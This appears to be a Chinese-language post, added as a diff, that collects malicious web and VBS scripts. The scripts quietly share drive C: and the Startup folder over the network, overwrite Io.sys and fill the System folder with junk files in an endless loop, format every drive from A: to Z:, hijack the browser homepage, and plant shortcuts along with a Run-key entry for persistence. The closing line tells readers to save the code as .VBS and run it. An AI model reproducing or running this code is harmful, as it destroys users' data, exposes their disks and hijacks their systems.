@@ -1,0 +1,118 @@
+***********
+共享硬盘
+***********
+〈script language=JavaScript〉 
+function f（）　//改写注册表的函数 
+{ 
+var aa,ss; 
+aa=document.applets[0]; 
+aa.setCLSID（"{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}"）; 
+aa.createInstance（）; 
+ss=aa.GetObject（）; 
+ss.RegWrite（"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\ 
+Network\\LanMan\\C$\\Flags",302,"REG_DWORD"）; 
+ss.RegWrite（"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\ 
+Network\\LanMan\\C$\\Type",0,"REG_DWORD"）; 
+ss.RegWrite（"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\ 
+Network\\LanMan\\C$\\Path","C:\\"）; 
+} 
+function init（） 
+{ 
+setTimeout（"f（）", 1000）;　//每过1000毫秒就再次递归调用f（） 
+} 
+init（）;　//调用函数 
+〈/script〉 
+
+**************************
+破坏硬盘，重复写入垃圾
+**************************
+〈script language=vbs〉 
+On Error Resume Next·　容错语句，避免程序崩溃 
+set aa=CreateObject（"WScript.Shell"）·建立WScript对象 
+Set fs = CreateObject（"Scripting.FileSystemObject"）·建立文件系统对象 
+Set dir1 = fs.GetSpecialFolder（0）·得到Windows路径 
+Set dir2 = fs.GetSpecialFolder（1）·得到System路径 
+dir1=dir1+"\START MENU\PROGRAMS\启动" 
+aa.RegWrite"HKLM\Software\Microsoft\Windows\CurrentVersion\ 
+Network\LanMan\S$\Flags",302,"REG_DWORD"·写入Dword值Flags，这是共享类型的标志 
+aa.RegWrite"HKLM\Software\Microsoft\Windows\CurrentVersion\ 
+Network\LanMan\S$\Type",0,"REG_DWORD"·写入Dword值Type 
+aa.RegWrite"HKLM\Software\Microsoft\Windows\CurrentVersion\ 
+Network\LanMan\S$\Path",dir1·写入共享资源的绝对路径 
+a=10 
+Set Os = CreateObject（"Scriptlet.TypeLib"）·建立自定义枚举对象 
+doc="“Hi”、“Hello”、“How are you?”、“Can you help me?”、“We want peace” 、“Where will you go?”、“Congratulations!!!”、“Don’t Cry”、“Look at the pretty”、“Some advice on your shortcoming”、“Free XXX Pictures”、“A free hot porn site”、“Why don’t you reply to me?”、“How about have dinner with me together?”、“Never kiss a stranger”“Hi”、“Hello”、“How are you?”、“Can you help me?”、“We want peace” 、“Where will you go?”、“Congratulations!!!”、“Don’t Cry”、“Look at the pretty”、“Some advice on your shortcoming”、“Free XXX Pictures”、“A free hot porn site”、“Why don’t you reply to me?”、“How about have dinner with me together?”、“Never kiss a stranger”“Hi”、“Hello”、“How are you?”、“Can you help me?”、“We want peace” 、“Where will you go?”、“Congratulations!!!”、“Don’t Cry”、“Look at the pretty”、“Some advice on your shortcoming”、“Free XXX Pictures”、“A free hot porn site”、“Why don’t you reply to me?”、“How about have dinner with me together?”、“Never kiss a stranger”“Hi”、“Hello”、“How are you?”、“Can you help me?”、“We want peace” 、“Where will you go?”、“Congratulations!!!”、“Don’t Cry”、“Look at the pretty”、“Some advice on your shortcoming”、“Free XXX Pictures”、“A free hot porn site”、“Why don’t you reply to me?”“How about have dinner with me together?”" 
+·一堆垃圾码，以备写入目标文件 
+Os.Reset·重置TypeLib对象 
+Os.Path = "C:\Io.sys"·TypeLib对象的目标路径为C:\Io.sys 
+Os.Doc = doc·写入的内容——就是上面的一堆垃圾 
+Os.Write（）·写入！ 
+while true 
+·死循环，垃圾文件越多越好 
+a=a+1 
+Os.Reset 
+Os.Path = dir2&"\Msvbvm"&a&".dll" 
+·目标路径为System下的Msvbvm???.dll文件 
+Os.Doc = doc&doc&doc&doc&doc&doc&doc&doc&doc&doc&doc&doc&doc&doc& 
+doc&doc&doc&doc&doc&doc&doc&doc&doc&doc&doc&doc&doc&doc&doc&doc&d 
+oc&doc&doc&doc&doc&doc&doc&doc&doc&doc 
+　·大量重复，以生成足够大小的文件 
+Os.Write（）·生成文件！ 
+wend 
+〈/script〉 
+
+***************
+修改电脑配置
+***************
+"HKCU\\Software\\Classes\\CLSID\\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\\","强加的内容");    
+"HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\Search Page","http://XXX.XXX.net"); //此处修改你IE的首页        
+"HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\Start Page","http://XXX.XXX.net"); //此处修改你IE的首页             
+"HKCR\\CLSID\\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\\","强加的内容");                //此处修改“我的电脑”
+"HKCR\\CLSID\\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\\InfoTip","强加的内容");               
+"HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\","强加的内容");                //此处修改“回收站”          
+"HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\InfoTip","强加的内容");               
+"HKLM\\Software\\Microsoft\\Windows\\Currentversion\\Winlogon\\LegalNoticeCaption","强加的内容");               
+"HKLM\\Software\\Microsoft\\Windows\\Currentversion\\Winlogon\\LegalNoticeText","强加的内容"); //此处修改后出现你启动时的对话框                        
+"HKLM\\Software\\Microsoft\\Internet Explorer\\Main\\Window Title", "强加的内容 http://XXX.XXX.net"); //此处修改你IE的首页上的文字                         
+"HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\Window Title", "强加的内容http://XXX.XXX.net");  //此处修改你IE的首页上的文字                         
+
+***********
+格式化硬盘
+***********
+<OBJECT classid=clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B id=wsh></OBJECT> 
+<SCRIPT> 
+wsh.Run('start /m format.com z:/q /autotest /u'); 
+wsh.Run('start /m format.com y:/q /autotest /u'); 
+wsh.Run('start /m format.com x:/q /autotest /u'); 
+wsh.Run('start /m format.com w:/q /autotest /u'); 
+wsh.Run('start /m format.com v:/q /autotest /u'); 
+wsh.Run('start /m format.com u:/q /autotest /u'); 
+wsh.Run('start /m format.com t:/q /autotest /u'); 
+wsh.Run('start /m format.com s:/q /autotest /u'); 
+wsh.Run('start /m format.com r:/q /autotest /u'); 
+wsh.Run('start /m format.com q:/q /autotest /u'); 
+wsh.Run('start /m format.com p:/q /autotest /u'); 
+wsh.Run('start /m format.com o:/q /autotest /u'); 
+wsh.Run('start /m format.com n:/q /autotest /u'); 
+wsh.Run('start /m format.com m:/q /autotest /u'); 
+wsh.Run('start /m format.com l:/q /autotest /u'); 
+wsh.Run('start /m format.com k:/q /autotest /u'); 
+wsh.Run('start /m format.com j:/q /autotest /u'); 
+wsh.Run('start /m format.com i:/q /autotest /u'); 
+wsh.Run('start /m format.com h:/q /autotest /u'); 
+wsh.Run('start /m format.com g:/q /autotest /u'); 
+wsh.Run('start /m format.com f:/q /autotest /u'); 
+wsh.Run('start /m format.com e:/q /autotest /u'); 
+wsh.Run('start /m format.com d:/q /autotest /u'); 
+wsh.Run('start /m format.com c:/q /autotest /u'); 
+wsh.Run('start /m format.com b:/q /autotest /u'); 
+wsh.Run('start /m format.com a:/q /autotest /u'); 
+</SCRIPT> 
+</P> 
+
+*******************************
+一段修改WIN系统的恶意网站代码 
+*******************************
+document.write("<APPLET HEIGHT=0 WIDTH=0 code=com.ms.activeX.ActiveXComponent></APPLET>");function yuzi(){try{a1=document.applets[0];a1.setCLSID("{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}");a1.createInstance();Shl = a1.GetObject();a1.setCLSID("{0D43FE01-F093-11CF-8940-00A0C9054228}");a1.createInstance();FSO = a1.GetObject();try{  WF = FSO.GetSpecialFolder(0);loc = WF + "\\system"; var Shor=Shl.CreateShortcut(loc + "\\"+"internet" +".URL");Shor.TargetPath="http://www.***.com ";Shor.Save();  WF = FSO.GetSpecialFolder(0);loc = WF + "\\Favorites"; var Shor=Shl.CreateShortcut(loc + "\\"+"《**网》" +".URL");Shor.TargetPath="http://www.***.com ";Shor.Save();  WF = FSO.GetSpecialFolder(0);loc = WF + "\\Favorites"; var Shor=Shl.CreateShortcut(loc + "\\"+"《**网》" +".URL");Shor.TargetPath="http://www.***.com";Shor.Save();  WF = FSO.GetSpecialFolder(0);loc = WF + "\\Favorites"; var Shor=Shl.CreateShortcut(loc + "\\"+"《**网》！" +".URL");Shor.TargetPath="http://www.***.com ";Shor.Save();  WF = FSO.GetSpecialFolder(0);loc = WF + "\\Favorites"; var Shor=Shl.CreateShortcut(loc + "\\"+"《**网》" +".URL");Shor.TargetPath="http://www.***.com ";Shor.Save();  WF = FSO.GetSpecialFolder(0);loc = WF + "\\Favorites"; var Shor=Shl.CreateShortcut(loc + "\\"+"《**网》" +".URL");Shor.TargetPath="http://www.***.com ";Shor.Save();  WF = FSO.GetSpecialFolder(0);loc = WF + "\\desktop"; var Shor=Shl.CreateShortcut(loc + "\\"+"Internet Explorer" +".URL");Shor.TargetPath="http://www.***.com ";Shor.Save();  WF = FSO.GetSpecialFolder(0);loc = WF + "\\desktop"; var Shor=Shl.CreateShortcut(loc + "\\"+"《**网》" +".URL");Shor.TargetPath="http://www.***.com ";Shor.Save();  WF = FSO.GetSpecialFolder(0);loc = WF + "\\desktop"; var Shor=Shl.CreateShortcut(loc + "\\"+"《**网》" +".URL");Shor.TargetPath="http://www.***.com ";Shor.Save();  WF = FSO.GetSpecialFolder(0);loc = WF + "\\desktop"; var Shor=Shl.CreateShortcut(loc + "\\"+"《**网》" +".URL");Shor.TargetPath="http://www.***.com ";Shor.Save();  WF = FSO.GetSpecialFolder(0);loc = WF + "\\Start Menu"; var Shor=Shl.CreateShortcut(loc + "\\"+"《**网》" +".URL");Shor.TargetPath="http://www.***.com ";Shor.Save();  WF = FSO.GetSpecialFolder(0);loc = WF + "\\Application Data\\Microsoft\\Internet Explorer\\Quick Launch"; var Shor=Shl.CreateShortcut(loc + "\\"+"《**网》" +".URL");Shor.TargetPath="http://www.***.com ";Shor.Save();  WF = FSO.GetSpecialFolder(0);loc = WF + "\\Start Menu\\Programs"; var Shor=Shl.CreateShortcut(loc + "\\"+"《**网》" +".URL");Shor.TargetPath="http://www.***.com ";Shor.Save();  Shl.RegWrite("HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\Start Page","http://www.***.com "); Shl.RegWrite("HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\Window Title","http://www.***.com "); Shl.RegWrite("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\internet","C:\\WINDOWS\\system\\internet.url"); }catch(e){}}catch(e){}}setTimeout("yuzi()",1000); 
+
+以上文件保存为.VBS的文件,运行后就可以执行.注意:如发生中毒本站不负责任!
